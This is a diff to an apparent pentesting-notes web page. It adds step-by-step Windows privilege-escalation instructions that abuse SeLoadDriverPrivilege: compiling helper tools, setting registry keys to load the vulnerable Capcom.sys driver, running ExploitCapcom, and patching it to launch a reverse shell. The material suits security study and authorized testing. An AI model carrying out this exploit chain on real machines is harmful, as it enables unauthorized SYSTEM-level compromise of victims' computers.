@@ -19,7 +19,7 @@
     <div id="navbar-container"></div>
 
     <div class="main-container">
-        <div class="sidebar">
+        <div class="sidebar" style="width: 400px;">
             <h3>Quick content</h3>
             <ul id="sidebar-menu"></ul>
         </div>
@@ -389,20 +389,59 @@ sc start dns</code></pre>
                         <p>Print Operators is another highly privileged group, which grants its members the <b>SeLoadDriverPrivilege</b> If we perform the <b>whoami /priv</b> and don't see <b>SeLoadDriverPrivilege</b> privilge enabled will have bypass the UAC</p>
                         #Finish the process of bypassing the UAC
                         <p>Once we see the privilege we will upload the driver the driver Capcom.sys which contains a functionallity to allow any user to execute shellcode with SYSTEM privielges. Here are the steps</p>
-                        <p>We will use the tool <a class="notion-link" href="https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp">EnableSeLoadDriverPrivilege.cpp</a> download the file add the following libraries and compile it</p>
-
-
+                        <p>We will use the tool <a class="notion-link" href="https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp">EnableSeLoadDriverPrivilege.cpp</a> download the file, open it with Visual Studio and add the following libraries</p>
                         <pre><code class="language-powershell">#include &lt;windows.h&gt;
 #include &lt;assert.h&gt;
 #include &lt;winternl.h&gt;
 #include &lt;sddl.h&gt;
 #include &lt;stdio.h&gt;
 #include "tchar.h"</code></pre>
-                        <p>Compile the code by using</p>  
-                        open it visual studio and go to tools and command line powershell developer tools  
+                        <p>Finally compile the code by going to <b>Tools</b>-> <b>Command Line</b> -> <b>Powershell Developer Tools</b> and using the following command</p>  
                         <pre><code class="language-powershell"> cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp</code></pre>
+                        <p>This will generate a EnableSeLoadDriverPrivilege.exe file. Transfer that .exe to the target machine</p>
+                        <p>Now download the driver <a class="notion-link" href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">Capcom.sys</a> and add the following keys to the register <b>Remember the modify the path where the driver IS</b></p>
+                        <pre><code class="language-powershell">reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1</code></pre>
+                        <p>Now run</p> 
+                        <pre><code class="language-powershell">.\EnableSeLoadDriverPrivilege.exe</code></pre>
+                        <p>In case driver.exe is installed you can verify that capcom.sys was load successfully</p>
+                        <pre><code class="language-powershell">.\DriverView.exe /stext drivers.txt</code></pre>
+                        <p>Now finally  exploit it by downloading <a class="notion-link" href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom</a><b>Remember you need to download the whole repository and compile it using Visual Studio. This will generate a .exe file which can be transfered to the victim machine</b></p>
+                        <pre><code class="language-powershell">.\ExploitCapcom.exe   #Finally run the exploit</code></pre>
                         
+                        <h4>Alternative without GUI</h4>
+                        <ul>
+                        <p>First generate a reverse shell with msfconsole. You can use any commands listed in this blog</p>
+                        <p>Follow the same process but in the ExploitCapcom.cpp (after compiling it) modify the following function in order to execute a reverse shell</p>
+                        <pre><code class="language-powershell">static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT("C:\\Tools\\print\\shell.exe"); #Change this to execute any file
+    PROCESS_INFORMATION ProcessInfo;
+    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
+    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
+        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
+        &ProcessInfo))
+    {
+        return false;
+    }
+
+    CloseHandle(ProcessInfo.hThread);
+    CloseHandle(ProcessInfo.hProcess);
+    return true;
+}</code></pre>    
+                    </ul>
+
+                    <h4>Automate the process</h4>
+                    <ul>
+                        <p>If you would like to automate part of the process you only need to upload <b>EoPLoadDriver.exe</b>, <b>Capcom.sys</b> and <b>ExploitCapcom.exe</b> and <b>shell.exe</b> depending on the case </p>
+                        <p>Download <a class="notion-link" href="https://github.com/TarlogicSecurity/EoPLoadDriver/">EoPLoadDriver.exe</a> and compile it  from Visual Studio by using</p>
+                        <pre><code class="language-powershell">cl /DUNICODE /D_UNICODE /EHsc eoploaddriver.cpp /link Advapi32.lib Shell32.lib /out:eoploaddriver.exe</code></pre>
+                        <p>Transfer it to the target and run</p>
+                        <pre><code class="language-powershell">eoploaddriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys</code></pre>
+                        <p>With that the SeLoadDriverPrivilege will be enabled, the driver will be loaded you will only need to execute the exploit</p>
+                        <pre><code class="language-powershell">.\ExploitCapcom.exe</code></pre>
                         
+                    </ul>
 
                     <h2 id="BloodyAD">BloodyAD</h2>
                     <ul>
